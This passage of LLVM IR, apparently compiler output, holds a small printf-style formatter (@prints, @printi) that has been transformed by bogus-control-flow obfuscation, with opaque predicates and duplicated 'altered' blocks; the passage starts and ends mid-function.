  %616 = load i8*, i8** %5, align 8
  %617 = load i8, i8* %616, align 1
  %618 = zext i8 %617 to i32
  %619 = icmp eq i32 %618, 45
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %77
  %620 = load i8*, i8** %5, align 8
  %621 = load i8, i8* %620, align 1
  %622 = zext i8 %621 to i32
  %623 = icmp sle i32 %622, 57
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %98
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %125
  %624 = load i8*, i8** %5, align 8
  %625 = getelementptr inbounds i8, i8* %624, i32 1
  store i8* %625, i8** %5, align 8
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %144
  %626 = load i8*, i8** %5, align 8
  %627 = load i8, i8* %626, align 1
  %628 = zext i8 %627 to i32
  %629 = icmp eq i32 %628, 115
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %170
  %630 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %166, i32 0, i32 3
  %631 = load i8*, i8** %630, align 8
  %632 = getelementptr i8, i8* %631, i32 %168
  %633 = bitcast i8* %632 to i32*
  %_ = shl i32 %168, 8
  %_19 = sub i32 0, %168
  %gen = add i32 %_19, 8
  %634 = add i32 %168, 8
  store i32 %634, i32* %167, align 8
  br label %originalBB18

originalBB23alteredBB:                            ; preds = %originalBB23, %197
  %635 = load i32, i32* %198, align 4
  %636 = sext i32 %635 to i64
  %637 = inttoptr i64 %636 to i8*
  store i8* %637, i8** %11, align 8
  %638 = load i8**, i8*** %4, align 8
  %639 = load i8*, i8** %11, align 8
  %640 = icmp ne i8* %639, null
  br label %originalBB23

originalBB27alteredBB:                            ; preds = %originalBB27, %221
  %641 = load i8*, i8** %11, align 8
  br label %originalBB27

originalBB31alteredBB:                            ; preds = %originalBB31, %240
  %642 = load i32, i32* %7, align 4
  %643 = load i32, i32* %8, align 4
  %644 = call i32 @prints(i8** %210, i8* %241, i32 %642, i32 %643)
  %645 = load i32, i32* %9, align 4
  %_32 = shl i32 %645, %644
  %_33 = sub i32 %645, %644
  %gen34 = mul i32 %_33, %644
  %_35 = sub i32 0, %645
  %gen36 = add i32 %_35, %644
  %_37 = sub i32 0, %645
  %gen38 = add i32 %_37, %644
  %_39 = shl i32 %645, %644
  %_40 = sub i32 0, %645
  %gen41 = add i32 %_40, %644
  %_42 = shl i32 %645, %644
  %_43 = sub i32 %645, %644
  %gen44 = mul i32 %_43, %644
  %_45 = sub i32 0, %645
  %gen46 = add i32 %_45, %644
  %646 = add nsw i32 %645, %644
  store i32 %646, i32* %9, align 4
  br label %originalBB31

originalBB50alteredBB:                            ; preds = %originalBB50, %263
  %647 = load i8*, i8** %5, align 8
  %648 = load i8, i8* %647, align 1
  %649 = zext i8 %648 to i32
  %650 = icmp eq i32 %649, 100
  br label %originalBB50

originalBB54alteredBB:                            ; preds = %originalBB54, %290
  %651 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %286, i32 0, i32 3
  %652 = load i8*, i8** %651, align 8
  %653 = getelementptr i8, i8* %652, i32 %288
  %654 = bitcast i8* %653 to i32*
  %_55 = shl i32 %288, 8
  %_56 = sub i32 0, %288
  %gen57 = add i32 %_56, 8
  %_58 = shl i32 %288, 8
  %_59 = sub i32 %288, 8
  %gen60 = mul i32 %_59, 8
  %_61 = sub i32 0, %288
  %gen62 = add i32 %_61, 8
  %_63 = shl i32 %288, 8
  %_64 = sub i32 %288, 8
  %gen65 = mul i32 %_64, 8
  %655 = add i32 %288, 8
  store i32 %655, i32* %287, align 8
  br label %originalBB54

originalBB69alteredBB:                            ; preds = %originalBB69, %330
  %656 = load i8**, i8*** %4, align 8
  %657 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %658 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %657, i32 0, i32 0
  %659 = load i32, i32* %658, align 8
  %660 = icmp ule i32 %659, 40
  br label %originalBB69

originalBB73alteredBB:                            ; preds = %originalBB73, %393
  %661 = load i32, i32* %394, align 4
  %662 = load i32, i32* %7, align 4
  %663 = load i32, i32* %8, align 4
  %664 = call i32 @printi(i8** %377, i32 %661, i32 16, i32 0, i32 %662, i32 %663, i32 65)
  %665 = load i32, i32* %9, align 4
  %_74 = sub i32 0, %665
  %gen75 = add i32 %_74, %664
  %_76 = shl i32 %665, %664
  %_77 = sub i32 0, %665
  %gen78 = add i32 %_77, %664
  %_79 = sub i32 0, %665
  %gen80 = add i32 %_79, %664
  %_81 = shl i32 %665, %664
  %666 = add nsw i32 %665, %664
  store i32 %666, i32* %9, align 4
  br label %originalBB73

originalBB85alteredBB:                            ; preds = %originalBB85, %434
  %667 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %424, i32 0, i32 2
  %668 = load i8*, i8** %667, align 8
  %669 = bitcast i8* %668 to i32*
  %670 = getelementptr i8, i8* %668, i32 8
  store i8* %670, i8** %667, align 8
  br label %originalBB85

originalBB89alteredBB:                            ; preds = %originalBB89, %463
  %671 = load i8*, i8** %5, align 8
  %672 = load i8, i8* %671, align 1
  %673 = zext i8 %672 to i32
  %674 = icmp eq i32 %673, 99
  br label %originalBB89

originalBB93alteredBB:                            ; preds = %originalBB93, %489
  %675 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %485, i32 0, i32 3
  %676 = load i8*, i8** %675, align 8
  %677 = getelementptr i8, i8* %676, i32 %487
  %678 = bitcast i8* %677 to i32*
  %_94 = sub i32 0, %487
  %gen95 = add i32 %_94, 8
  %_96 = shl i32 %487, 8
  %_97 = sub i32 %487, 8
  %gen98 = mul i32 %_97, 8
  %_99 = sub i32 %487, 8
  %gen100 = mul i32 %_99, 8
  %679 = add i32 %487, 8
  store i32 %679, i32* %486, align 8
  br label %originalBB93

originalBB104alteredBB:                           ; preds = %originalBB104, %511
  %680 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %485, i32 0, i32 2
  %681 = load i8*, i8** %680, align 8
  %682 = bitcast i8* %681 to i32*
  %683 = getelementptr i8, i8* %681, i32 8
  store i8* %683, i8** %680, align 8
  br label %originalBB104

originalBB108alteredBB:                           ; preds = %originalBB108, %554
  br label %originalBB108

originalBB112alteredBB:                           ; preds = %originalBB112, %574
  %684 = load i8**, i8*** %4, align 8
  %685 = icmp ne i8** %684, null
  br label %originalBB112

originalBB116alteredBB:                           ; preds = %originalBB116, %593
  %686 = load i8**, i8*** %4, align 8
  %687 = load i8*, i8** %686, align 8
  store i8 0, i8* %687, align 1
  br label %originalBB116
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @prints(i8**, i8*, i32, i32) #0 {
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  store i8** %0, i8*** %5, align 8
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  store i32 0, i32* %9, align 4
  store i32 32, i32* %10, align 4
  %13 = load i32, i32* %7, align 4
  %14 = icmp sgt i32 %13, 0
  br i1 %14, label %15, label %106

; <label>:15:                                     ; preds = %4
  %16 = load i32, i32* @x.33
  %17 = load i32, i32* @y.34
  %18 = sub i32 %16, 1
  %19 = mul i32 %16, %18
  %20 = urem i32 %19, 2
  %21 = icmp eq i32 %20, 0
  %22 = icmp slt i32 %17, 10
  %23 = or i1 %21, %22
  br i1 %23, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %15
  store i32 0, i32* %11, align 4
  %24 = load i8*, i8** %6, align 8
  store i8* %24, i8** %12, align 8
  %25 = load i32, i32* @x.33
  %26 = load i32, i32* @y.34
  %27 = sub i32 %25, 1
  %28 = mul i32 %25, %27
  %29 = urem i32 %28, 2
  %30 = icmp eq i32 %29, 0
  %31 = icmp slt i32 %26, 10
  %32 = or i1 %30, %31
  br i1 %32, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %33

; <label>:33:                                     ; preds = %56, %originalBBpart2
  %34 = load i32, i32* @x.33
  %35 = load i32, i32* @y.34
  %36 = sub i32 %34, 1
  %37 = mul i32 %34, %36
  %38 = urem i32 %37, 2
  %39 = icmp eq i32 %38, 0
  %40 = icmp slt i32 %35, 10
  %41 = or i1 %39, %40
  br i1 %41, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %33
  %42 = load i8*, i8** %12, align 8
  %43 = load i8, i8* %42, align 1
  %44 = icmp ne i8 %43, 0
  %45 = load i32, i32* @x.33
  %46 = load i32, i32* @y.34
  %47 = sub i32 %45, 1
  %48 = mul i32 %45, %47
  %49 = urem i32 %48, 2
  %50 = icmp eq i32 %49, 0
  %51 = icmp slt i32 %46, 10
  %52 = or i1 %50, %51
  br i1 %52, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %44, label %53, label %59

; <label>:53:                                     ; preds = %originalBBpart24
  %54 = load i32, i32* %11, align 4
  %55 = add nsw i32 %54, 1
  store i32 %55, i32* %11, align 4
  br label %56

; <label>:56:                                     ; preds = %53
  %57 = load i8*, i8** %12, align 8
  %58 = getelementptr inbounds i8, i8* %57, i32 1
  store i8* %58, i8** %12, align 8
  br label %33

; <label>:59:                                     ; preds = %originalBBpart24
  %60 = load i32, i32* %11, align 4
  %61 = load i32, i32* %7, align 4
  %62 = icmp sge i32 %60, %61
  br i1 %62, label %63, label %64

; <label>:63:                                     ; preds = %59
  store i32 0, i32* %7, align 4
  br label %84

; <label>:64:                                     ; preds = %59
  %65 = load i32, i32* @x.33
  %66 = load i32, i32* @y.34
  %67 = sub i32 %65, 1
  %68 = mul i32 %65, %67
  %69 = urem i32 %68, 2
  %70 = icmp eq i32 %69, 0
  %71 = icmp slt i32 %66, 10
  %72 = or i1 %70, %71
  br i1 %72, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %64
  %73 = load i32, i32* %11, align 4
  %74 = load i32, i32* %7, align 4
  %75 = sub nsw i32 %74, %73
  store i32 %75, i32* %7, align 4
  %76 = load i32, i32* @x.33
  %77 = load i32, i32* @y.34
  %78 = sub i32 %76, 1
  %79 = mul i32 %76, %78
  %80 = urem i32 %79, 2
  %81 = icmp eq i32 %80, 0
  %82 = icmp slt i32 %77, 10
  %83 = or i1 %81, %82
  br i1 %83, label %originalBBpart216, label %originalBB6alteredBB

originalBBpart216:                                ; preds = %originalBB6
  br label %84

; <label>:84:                                     ; preds = %originalBBpart216, %63
  %85 = load i32, i32* %8, align 4
  %86 = and i32 %85, 2
  %87 = icmp ne i32 %86, 0
  br i1 %87, label %88, label %89

; <label>:88:                                     ; preds = %84
  store i32 48, i32* %10, align 4
  br label %89

; <label>:89:                                     ; preds = %88, %84
  %90 = load i32, i32* @x.33
  %91 = load i32, i32* @y.34
  %92 = sub i32 %90, 1
  %93 = mul i32 %90, %92
  %94 = urem i32 %93, 2
  %95 = icmp eq i32 %94, 0
  %96 = icmp slt i32 %91, 10
  %97 = or i1 %95, %96
  br i1 %97, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %89
  %98 = load i32, i32* @x.33
  %99 = load i32, i32* @y.34
  %100 = sub i32 %98, 1
  %101 = mul i32 %98, %100
  %102 = urem i32 %101, 2
  %103 = icmp eq i32 %102, 0
  %104 = icmp slt i32 %99, 10
  %105 = or i1 %103, %104
  br i1 %105, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %106

; <label>:106:                                    ; preds = %originalBBpart220, %4
  %107 = load i32, i32* @x.33
  %108 = load i32, i32* @y.34
  %109 = sub i32 %107, 1
  %110 = mul i32 %107, %109
  %111 = urem i32 %110, 2
  %112 = icmp eq i32 %111, 0
  %113 = icmp slt i32 %108, 10
  %114 = or i1 %112, %113
  br i1 %114, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %106
  %115 = load i32, i32* %8, align 4
  %116 = and i32 %115, 1
  %117 = icmp ne i32 %116, 0
  %118 = load i32, i32* @x.33
  %119 = load i32, i32* @y.34
  %120 = sub i32 %118, 1
  %121 = mul i32 %118, %120
  %122 = urem i32 %121, 2
  %123 = icmp eq i32 %122, 0
  %124 = icmp slt i32 %119, 10
  %125 = or i1 %123, %124
  br i1 %125, label %originalBBpart232, label %originalBB22alteredBB

originalBBpart232:                                ; preds = %originalBB22
  br i1 %117, label %155, label %126

; <label>:126:                                    ; preds = %originalBBpart232
  br label %127

; <label>:127:                                    ; preds = %151, %126
  %128 = load i32, i32* @x.33
  %129 = load i32, i32* @y.34
  %130 = sub i32 %128, 1
  %131 = mul i32 %128, %130
  %132 = urem i32 %131, 2
  %133 = icmp eq i32 %132, 0
  %134 = icmp slt i32 %129, 10
  %135 = or i1 %133, %134
  br i1 %135, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %127
  %136 = load i32, i32* %7, align 4
  %137 = icmp sgt i32 %136, 0
  %138 = load i32, i32* @x.33
  %139 = load i32, i32* @y.34
  %140 = sub i32 %138, 1
  %141 = mul i32 %138, %140
  %142 = urem i32 %141, 2
  %143 = icmp eq i32 %142, 0
  %144 = icmp slt i32 %139, 10
  %145 = or i1 %143, %144
  br i1 %145, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br i1 %137, label %146, label %154

; <label>:146:                                    ; preds = %originalBBpart236
  %147 = load i8**, i8*** %5, align 8
  %148 = load i32, i32* %10, align 4
  call void @printchar(i8** %147, i32 %148)
  %149 = load i32, i32* %9, align 4
  %150 = add nsw i32 %149, 1
  store i32 %150, i32* %9, align 4
  br label %151

; <label>:151:                                    ; preds = %146
  %152 = load i32, i32* %7, align 4
  %153 = add nsw i32 %152, -1
  store i32 %153, i32* %7, align 4
  br label %127

; <label>:154:                                    ; preds = %originalBBpart236
  br label %155

; <label>:155:                                    ; preds = %154, %originalBBpart232
  br label %156

; <label>:156:                                    ; preds = %183, %155
  %157 = load i8*, i8** %6, align 8
  %158 = load i8, i8* %157, align 1
  %159 = icmp ne i8 %158, 0
  br i1 %159, label %160, label %186

; <label>:160:                                    ; preds = %156
  %161 = load i32, i32* @x.33
  %162 = load i32, i32* @y.34
  %163 = sub i32 %161, 1
  %164 = mul i32 %161, %163
  %165 = urem i32 %164, 2
  %166 = icmp eq i32 %165, 0
  %167 = icmp slt i32 %162, 10
  %168 = or i1 %166, %167
  br i1 %168, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %160
  %169 = load i8**, i8*** %5, align 8
  %170 = load i8*, i8** %6, align 8
  %171 = load i8, i8* %170, align 1
  %172 = zext i8 %171 to i32
  call void @printchar(i8** %169, i32 %172)
  %173 = load i32, i32* %9, align 4
  %174 = add nsw i32 %173, 1
  store i32 %174, i32* %9, align 4
  %175 = load i32, i32* @x.33
  %176 = load i32, i32* @y.34
  %177 = sub i32 %175, 1
  %178 = mul i32 %175, %177
  %179 = urem i32 %178, 2
  %180 = icmp eq i32 %179, 0
  %181 = icmp slt i32 %176, 10
  %182 = or i1 %180, %181
  br i1 %182, label %originalBBpart250, label %originalBB38alteredBB

originalBBpart250:                                ; preds = %originalBB38
  br label %183

; <label>:183:                                    ; preds = %originalBBpart250
  %184 = load i8*, i8** %6, align 8
  %185 = getelementptr inbounds i8, i8* %184, i32 1
  store i8* %185, i8** %6, align 8
  br label %156

; <label>:186:                                    ; preds = %156
  br label %187

; <label>:187:                                    ; preds = %195, %186
  %188 = load i32, i32* %7, align 4
  %189 = icmp sgt i32 %188, 0
  br i1 %189, label %190, label %198

; <label>:190:                                    ; preds = %187
  %191 = load i8**, i8*** %5, align 8
  %192 = load i32, i32* %10, align 4
  call void @printchar(i8** %191, i32 %192)
  %193 = load i32, i32* %9, align 4
  %194 = add nsw i32 %193, 1
  store i32 %194, i32* %9, align 4
  br label %195

; <label>:195:                                    ; preds = %190
  %196 = load i32, i32* %7, align 4
  %197 = add nsw i32 %196, -1
  store i32 %197, i32* %7, align 4
  br label %187

; <label>:198:                                    ; preds = %187
  %199 = load i32, i32* @x.33
  %200 = load i32, i32* @y.34
  %201 = sub i32 %199, 1
  %202 = mul i32 %199, %201
  %203 = urem i32 %202, 2
  %204 = icmp eq i32 %203, 0
  %205 = icmp slt i32 %200, 10
  %206 = or i1 %204, %205
  br i1 %206, label %originalBB52, label %originalBB52alteredBB

originalBB52:                                     ; preds = %originalBB52alteredBB, %198
  %207 = load i32, i32* %9, align 4
  %208 = load i32, i32* @x.33
  %209 = load i32, i32* @y.34
  %210 = sub i32 %208, 1
  %211 = mul i32 %208, %210
  %212 = urem i32 %211, 2
  %213 = icmp eq i32 %212, 0
  %214 = icmp slt i32 %209, 10
  %215 = or i1 %213, %214
  br i1 %215, label %originalBBpart254, label %originalBB52alteredBB

originalBBpart254:                                ; preds = %originalBB52
  ret i32 %207

originalBBalteredBB:                              ; preds = %originalBB, %15
  store i32 0, i32* %11, align 4
  %216 = load i8*, i8** %6, align 8
  store i8* %216, i8** %12, align 8
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %33
  %217 = load i8*, i8** %12, align 8
  %218 = load i8, i8* %217, align 1
  %219 = icmp ne i8 %218, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %64
  %220 = load i32, i32* %11, align 4
  %221 = load i32, i32* %7, align 4
  %_ = sub i32 0, %221
  %gen = add i32 %_, %220
  %_7 = sub i32 0, %221
  %gen8 = add i32 %_7, %220
  %_9 = sub i32 0, %221
  %gen10 = add i32 %_9, %220
  %_11 = shl i32 %221, %220
  %_12 = shl i32 %221, %220
  %_13 = sub i32 0, %221
  %gen14 = add i32 %_13, %220
  %222 = sub nsw i32 %221, %220
  store i32 %222, i32* %7, align 4
  br label %originalBB6

originalBB18alteredBB:                            ; preds = %originalBB18, %89
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %106
  %223 = load i32, i32* %8, align 4
  %_23 = sub i32 %223, 1
  %gen24 = mul i32 %_23, 1
  %_25 = sub i32 %223, 1
  %gen26 = mul i32 %_25, 1
  %_27 = sub i32 0, %223
  %gen28 = add i32 %_27, 1
  %_29 = sub i32 %223, 1
  %gen30 = mul i32 %_29, 1
  %224 = and i32 %223, 1
  %225 = icmp ne i32 %224, 0
  br label %originalBB22

originalBB34alteredBB:                            ; preds = %originalBB34, %127
  %226 = load i32, i32* %7, align 4
  %227 = icmp sgt i32 %226, 0
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %160
  %228 = load i8**, i8*** %5, align 8
  %229 = load i8*, i8** %6, align 8
  %230 = load i8, i8* %229, align 1
  %231 = zext i8 %230 to i32
  call void @printchar(i8** %228, i32 %231)
  %232 = load i32, i32* %9, align 4
  %_39 = sub i32 %232, 1
  %gen40 = mul i32 %_39, 1
  %_41 = sub i32 0, %232
  %gen42 = add i32 %_41, 1
  %_43 = sub i32 0, %232
  %gen44 = add i32 %_43, 1
  %_45 = sub i32 %232, 1
  %gen46 = mul i32 %_45, 1
  %_47 = sub i32 0, %232
  %gen48 = add i32 %_47, 1
  %233 = add nsw i32 %232, 1
  store i32 %233, i32* %9, align 4
  br label %originalBB38

originalBB52alteredBB:                            ; preds = %originalBB52, %198
  %234 = load i32, i32* %9, align 4
  br label %originalBB52
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @printi(i8**, i32, i32, i32, i32, i32, i32) #0 {
  %8 = load i32, i32* @x.35
  %9 = load i32, i32* @y.36
  %10 = sub i32 %8, 1
  %11 = mul i32 %8, %10
  %12 = urem i32 %11, 2
  %13 = icmp eq i32 %12, 0
  %14 = icmp slt i32 %9, 10
  %15 = or i1 %13, %14
  br i1 %15, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %7
  %16 = alloca i32, align 4
  %17 = alloca i8**, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca [12 x i8], align 1
  %25 = alloca i8*, align 8
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  store i8** %0, i8*** %17, align 8
  store i32 %1, i32* %18, align 4
  store i32 %2, i32* %19, align 4
  store i32 %3, i32* %20, align 4
  store i32 %4, i32* %21, align 4
  store i32 %5, i32* %22, align 4
  store i32 %6, i32* %23, align 4
  store i32 0, i32* %27, align 4
  store i32 0, i32* %28, align 4
  %30 = load i32, i32* %18, align 4
  store i32 %30, i32* %29, align 4
  %31 = load i32, i32* %18, align 4
  %32 = icmp eq i32 %31, 0
  %33 = load i32, i32* @x.35
  %34 = load i32, i32* @y.36
  %35 = sub i32 %33, 1
  %36 = mul i32 %33, %35
  %37 = urem i32 %36, 2
  %38 = icmp eq i32 %37, 0
  %39 = icmp slt i32 %34, 10
  %40 = or i1 %38, %39
  br i1 %40, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %32, label %41, label %49

; <label>:41:                                     ; preds = %originalBBpart2
  %42 = getelementptr inbounds [12 x i8], [12 x i8]* %24, i64 0, i64 0
  store i8 48, i8* %42, align 1
  %43 = getelementptr inbounds [12 x i8], [12 x i8]* %24, i64 0, i64 1
  store i8 0, i8* %43, align 1
  %44 = load i8**, i8*** %17, align 8
  %45 = getelementptr inbounds [12 x i8], [12 x i8]* %24, i32 0, i32 0
  %46 = load i32, i32* %21, align 4
  %47 = load i32, i32* %22, align 4
  %48 = call i32 @prints(i8** %44, i8* %45, i32 %46, i32 %47)
  store i32 %48, i32* %16, align 4
  br label %166

; <label>:49:                                     ; preds = %originalBBpart2
  %50 = load i32, i32* @x.35
  %51 = load i32, i32* @y.36
  %52 = sub i32 %50, 1
  %53 = mul i32 %50, %52
  %54 = urem i32 %53, 2
  %55 = icmp eq i32 %54, 0
  %56 = icmp slt i32 %51, 10
  %57 = or i1 %55, %56
  br i1 %57, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %49
  %58 = load i32, i32* %20, align 4
  %59 = icmp ne i32 %58, 0
  %60 = load i32, i32* @x.35
  %61 = load i32, i32* @y.36
  %62 = sub i32 %60, 1
  %63 = mul i32 %60, %62
  %64 = urem i32 %63, 2
  %65 = icmp eq i32 %64, 0
  %66 = icmp slt i32 %61, 10
  %67 = or i1 %65, %66
  br i1 %67, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %59, label %68, label %77

; <label>:68:                                     ; preds = %originalBBpart24
  %69 = load i32, i32* %19, align 4
  %70 = icmp eq i32 %69, 10
  br i1 %70, label %71, label %77

; <label>:71:                                     ; preds = %68
  %72 = load i32, i32* %18, align 4
  %73 = icmp slt i32 %72, 0
  br i1 %73, label %74, label %77

; <label>:74:                                     ; preds = %71
  store i32 1, i32* %27, align 4
  %75 = load i32, i32* %18, align 4
  %76 = sub nsw i32 0, %75
  store i32 %76, i32* %29, align 4
  br label %77

; <label>:77:                                     ; preds = %74, %71, %68, %originalBBpart24
  %78 = getelementptr inbounds [12 x i8], [12 x i8]* %24, i32 0, i32 0
  %79 = getelementptr inbounds i8, i8* %78, i64 12
  %80 = getelementptr inbounds i8, i8* %79, i64 -1
  store i8* %80, i8** %25, align 8
  %81 = load i8*, i8** %25, align 8
  store i8 0, i8* %81, align 1
  br label %82

; <label>:82:                                     ; preds = %113, %77
  %83 = load i32, i32* %29, align 4
  %84 = icmp ne i32 %83, 0
  br i1 %84, label %85, label %122

; <label>:85:                                     ; preds = %82
  %86 = load i32, i32* @x.35
  %87 = load i32, i32* @y.36
  %88 = sub i32 %86, 1
  %89 = mul i32 %86, %88
  %90 = urem i32 %89, 2
  %91 = icmp eq i32 %90, 0
  %92 = icmp slt i32 %87, 10
  %93 = or i1 %91, %92
  br i1 %93, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %85
  %94 = load i32, i32* %29, align 4
  %95 = load i32, i32* %19, align 4
  %96 = urem i32 %94, %95
  store i32 %96, i32* %26, align 4
  %97 = load i32, i32* %26, align 4
  %98 = icmp sge i32 %97, 10
  %99 = load i32, i32* @x.35
  %100 = load i32, i32* @y.36
  %101 = sub i32 %99, 1
  %102 = mul i32 %99, %101
  %103 = urem i32 %102, 2
  %104 = icmp eq i32 %103, 0
  %105 = icmp slt i32 %100, 10
  %106 = or i1 %104, %105
  br i1 %106, label %originalBBpart29, label %originalBB6alteredBB

originalBBpart29:                                 ; preds = %originalBB6
  br i1 %98, label %107, label %113

; <label>:107:                                    ; preds = %originalBBpart29
  %108 = load i32, i32* %23, align 4
  %109 = sub nsw i32 %108, 48
  %110 = sub nsw i32 %109, 10
  %111 = load i32, i32* %26, align 4
  %112 = add nsw i32 %111, %110
  store i32 %112, i32* %26, align 4
  br label %113

; <label>:113:                                    ; preds = %107, %originalBBpart29
  %114 = load i32, i32* %26, align 4
  %115 = add nsw i32 %114, 48
  %116 = trunc i32 %115 to i8
  %117 = load i8*, i8** %25, align 8
  %118 = getelementptr inbounds i8, i8* %117, i32 -1
  store i8* %118, i8** %25, align 8
  store i8 %116, i8* %118, align 1
  %119 = load i32, i32* %19, align 4
  %120 = load i32, i32* %29, align 4
  %121 = udiv i32 %120, %119
  store i32 %121, i32* %29, align 4
  br label %82

; <label>:122:                                    ; preds = %82
  %123 = load i32, i32* %27, align 4
  %124 = icmp ne i32 %123, 0
  br i1 %124, label %125, label %158

; <label>:125:                                    ; preds = %122
  %126 = load i32, i32* %21, align 4
  %127 = icmp ne i32 %126, 0
  br i1 %127, label %128, label %154

; <label>:128:                                    ; preds = %125
  %129 = load i32, i32* %22, align 4
  %130 = and i32 %129, 2
  %131 = icmp ne i32 %130, 0
  br i1 %131, label %132, label %154

; <label>:132:                                    ; preds = %128
  %133 = load i32, i32* @x.35
  %134 = load i32, i32* @y.36
  %135 = sub i32 %133, 1
  %136 = mul i32 %133, %135
  %137 = urem i32 %136, 2
  %138 = icmp eq i32 %137, 0
  %139 = icmp slt i32 %134, 10
  %140 = or i1 %138, %139
  br i1 %140, label %originalBB11, label %originalBB11alteredBB

originalBB11:                                     ; preds = %originalBB11alteredBB, %132
  %141 = load i8**, i8*** %17, align 8
  call void @printchar(i8** %141, i32 45)
  %142 = load i32, i32* %28, align 4
  %143 = add nsw i32 %142, 1
  store i32 %143, i32* %28, align 4
  %144 = load i32, i32* %21, align 4
  %145 = add nsw i32 %144, -1
  store i32 %145, i32* %21, align 4
  %146 = load i32, i32* @x.35
  %147 = load i32, i32* @y.36
  %148 = sub i32 %146, 1
  %149 = mul i32 %146, %148
  %150 = urem i32 %149, 2
  %151 = icmp eq i32 %150, 0
  %152 = icmp slt i32 %147, 10
  %153 = or i1 %151, %152
  br i1 %153, label %originalBBpart230, label %originalBB11alteredBB

originalBBpart230:                                ; preds = %originalBB11
  br label %157

; <label>:154:                                    ; preds = %128, %125
  %155 = load i8*, i8** %25, align 8
  %156 = getelementptr inbounds i8, i8* %155, i32 -1
  store i8* %156, i8** %25, align 8
  store i8 45, i8* %156, align 1
  br label %157

; <label>:157:                                    ; preds = %154, %originalBBpart230
  br label %158

; <label>:158:                                    ; preds = %157, %122
  %159 = load i32, i32* %28, align 4
  %160 = load i8**, i8*** %17, align 8
  %161 = load i8*, i8** %25, align 8
  %162 = load i32, i32* %21, align 4
  %163 = load i32, i32* %22, align 4
  %164 = call i32 @prints(i8** %160, i8* %161, i32 %162, i32 %163)
  %165 = add nsw i32 %159, %164
  store i32 %165, i32* %16, align 4
  br label %166

; <label>:166:                                    ; preds = %158, %41
  %167 = load i32, i32* %16, align 4
  ret i32 %167

originalBBalteredBB:                              ; preds = %originalBB, %7
  %168 = alloca i32, align 4
  %169 = alloca i8**, align 8
  %170 = alloca i32, align 4
  %171 = alloca i32, align 4
  %172 = alloca i32, align 4
  %173 = alloca i32, align 4
  %174 = alloca i32, align 4
  %175 = alloca i32, align 4
  %176 = alloca [12 x i8], align 1
  %177 = alloca i8*, align 8
  %178 = alloca i32, align 4
  %179 = alloca i32, align 4
  %180 = alloca i32, align 4
  %181 = alloca i32, align 4
  store i8** %0, i8*** %169, align 8
  store i32 %1, i32* %170, align 4
  store i32 %2, i32* %171, align 4
  store i32 %3, i32* %172, align 4
  store i32 %4, i32* %173, align 4
  store i32 %5, i32* %174, align 4
  store i32 %6, i32* %175, align 4
  store i32 0, i32* %179, align 4
  store i32 0, i32* %180, align 4
  %182 = load i32, i32* %170, align 4
  store i32 %182, i32* %181, align 4
  %183 = load i32, i32* %170, align 4
  %184 = icmp eq i32 %183, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %49
  %185 = load i32, i32* %20, align 4
  %186 = icmp ne i32 %185, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %85
  %187 = load i32, i32* %29, align 4
  %188 = load i32, i32* %19, align 4
  %_ = shl i32 %187, %188
  %_7 = sub i32 0, %187
  %gen = add i32 %_7, %188
  %189 = urem i32 %187, %188
  store i32 %189, i32* %26, align 4
  %190 = load i32, i32* %26, align 4
  %191 = icmp sge i32 %190, 10
  br label %originalBB6

originalBB11alteredBB:                            ; preds = %originalBB11, %132
